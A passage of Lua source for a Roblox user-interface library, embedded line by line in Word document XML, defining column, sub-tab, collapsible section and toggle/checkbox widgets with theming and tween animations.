    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local items = cfg.items do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "name"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self.items[ "button_holder"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Position = dim2(0, 40,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 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                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;    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-- Miscellaneous </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function library:column(properties) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local cfg = {items = {}, size = properties.size or 1}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local items = cfg.items; do     </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "column" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = self[ "parent" ] or self.items["tab_parent"];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BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0, 0, cfg.size,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PaddingBottom = dim(0, 10);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "column"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"column" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        HorizontalFlex = Enum.UIFlexAlignment.Fill;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Padding = dim(0, 10);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        FillDirection = Enum.FillDirection.Vertical;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end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return setmetatable(cfg, library)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function library:sub_tab(properties) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local cfg = {items = {}, order = properties.order or 0; size = properties.size or 1}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local items = cfg.items; do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "tab_parent" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = self.items[ "tab" ];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Size = dim2(0,0,cfg.size,0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Visible = true;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FillDirection = Enum.FillDirection.Horizontal;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        HorizontalFlex = Enum.UIFlexAlignment.Fill;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        VerticalFlex = Enum.UIFlexAlignment.Fill;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "tab_parent"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Enum.SortOrder.LayoutOrder;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return setmetatable(cfg, library)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        --</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:section(properties)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = properties.name or properties.Name or "section"; </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                side = properties.side or properties.Side or "left";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                default = properties.default or properties.Default or false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                size = properties.size or properties.Size or self.size or 0.5; </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                icon = properties.icon or properties.Icon or "http://www.roblox.com/asset/?id=6022668898";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                fading_toggle = properties.fading or properties.Fading or false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            };</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local items = cfg.items; do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "outline" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = self.items[ "column" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0, 0, cfg.size, -3);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(25, 25, 29)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                });</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:create( "UICorner" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "outline"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"inline" ] = library:create( "Frame" , {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Position = dim2(0, 1, 0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, -2, 1, -2);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(22, 22, 24)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"inline"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"scrolling" ] = library:create( "ScrollingFrame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ScrollBarImageColor3 = rgb(44, 44, 46);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Active = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AutomaticCanvasSize = Enum.AutomaticSize.Y;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ScrollBarThickness = 2;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "inline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, 0, 1, -40);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(0, 0, 0, 35);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(255, 255, 255);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CanvasSize = dim2(0, 0, 0, 0)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"elements" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "scrolling"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10, 0, 10);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, -20,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"elements" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Padding = dim(0, 10);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PaddingBottom = dim(0, 15);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "elements" ]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"button" ] = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    FontFace = fonts.font;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextColor3 = rgb(255, 255, 255);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AutoButtonColor = false;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Position = dim2(0, 1, 0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, -2, 0, 35);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextSize = 16;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(19, 19, 21)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"UIStroke" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Color = rgb(23, 23, 29);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Enabled = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border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"button"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"Icon" ] = library:create( "ImageLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ImageColor3 = themes.preset.accent;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AnchorPoint = vec2(0, 0.5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Image = cfg.icon;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(0, 10, 0.5, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0, 22, 0, 22);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"Icon" ], "accent", "ImageColor3");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "section_title"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rgb(255, 255, 255);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"button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0, 0, 1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(0, 40, 0, -1);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"button"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0,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if cfg.fading_toggle then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "toggle"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vec2(1, 0.5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(1, -9, 0.5, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0, 36, 0, 18);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rgb(58, 58, 62)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    });  library:apply_theme(items[ "toggle" ], "accent", "BackgroundColor3");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"toggle" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CornerRadius = dim(0, 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"toggle_outline" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "toggle" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, -2, 1, -2);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderMode = Enum.BorderMode.Inset;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0, 1, 0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(50, 50, 50)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    });  library:apply_theme(items[ "toggle_outline" ], "accent", "BackgroundColor3");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"toggle_outline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CornerRadius = dim(0, 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rgb(211, 211, 211)), rgbkey(1, rgb(211, 211, 211))};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "toggle_outline"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"toggle_circle" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "toggle_outline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0, 2, 0, 2);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0, 12, 0, 12);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(86, 86, 88)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"toggle_circle" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CornerRadius = dim(0, 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"outline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CornerRadius = dim(0, 7)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "fade" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "outline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundTransparency = 0.800000011920929;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";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BackgroundColor3 = rgb(0,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"fade" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CornerRadius = dim(0, 7)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if cfg.fading_toggle then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "button" ].InputBegan:Connect(function(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.Touch then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        cfg.default = not cfg.default </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        cfg.toggle_section(cfg.default) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                function cfg.toggle_section(bool)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(items[ "toggle" ], {BackgroundColor3 = bool and themes.preset.accent or rgb(58, 58, 62)}, Enum.EasingStyle.Quad)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(items[ "toggle_outline" ], {BackgroundColor3 = bool and themes.preset.accent or rgb(50, 50, 50)}, Enum.EasingStyle.Quad)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(items[ "toggle_circle" ], {BackgroundColor3 = bool and rgb(255, 255, 255) or rgb(86, 86, 88), Position = bool and dim2(1, -14, 0, 2) or dim2(0, 2, 0, 2)}, Enum.EasingStyle.Quad)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(items[ "fade" ], {BackgroundTransparency = bool and 1 or 0.8}, Enum.EasingStyle.Quad)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return setmetatable(cfg, library)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end  </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:toggle(options) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local rand = math.random(1, 2) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                enabled = options.default or false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = options.name or "Toggle",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                info = options.info or nil,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flag = options.flag or library:next_flag(),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                type = options.type and string.lower(options.type) or rand == 1 and "toggle" or "checkbox"; -- "toggle", "checkbox"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                default = options.default or false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                folding = options.folding or false, </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                callback = options.callback or function() end,</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                seperator = options.seperator or options.Seperator or false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            flags[cfg.flag] = cfg.default</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local items = cfg.items; do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "toggle"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"toggle"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/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if cfg.info then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "info"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rgb(130, 130, 130);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TextWrapped = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Text = cfg.info;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "toggle" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0, 5, 0, 17);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, -10,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"toggle" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(1, 0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0, 0, 1, 0);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FillDirection = Enum.FillDirection.Horizontal;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    HorizontalAlignment = Enum.HorizontalAlignment.Right;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "right_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Padding = dim(0, 9);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-- Toggle</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if cfg.type == "checkbox" then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        items[ "toggle_button" ] = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            FontFace = fonts.small;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            TextColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Text = "";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LayoutOrder = 2;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            AutoButtonColor = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            AnchorPoint = vec2(1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Parent = items[ "right_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Position = dim2(1, 0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Size = dim2(0, 16, 0, 16);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            TextSize = 14;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BackgroundColor3 = rgb(67, 67, 68)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        }); library:apply_theme(items[ "toggle_button" ], "accent", "BackgroundColor3");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"toggle_button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            CornerRadius = dim(0, 4)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items[ "outline" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Parent = items[ "toggle_button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Size = dim2(1, -2, 1, -2);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderMode = Enum.BorderMode.Inset;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Position = dim2(0, 1, 0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BackgroundColor3 = rgb(22, 22, 24)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        }); library:apply_theme(items[ "outline" ], "accent", "BackgroundColor3");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        items[ "tick" ] = library:create( "ImageLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            ImageTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Image = "rbxassetid://111862698467575";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Position = dim2(0, -1, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Parent = items[ "outline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
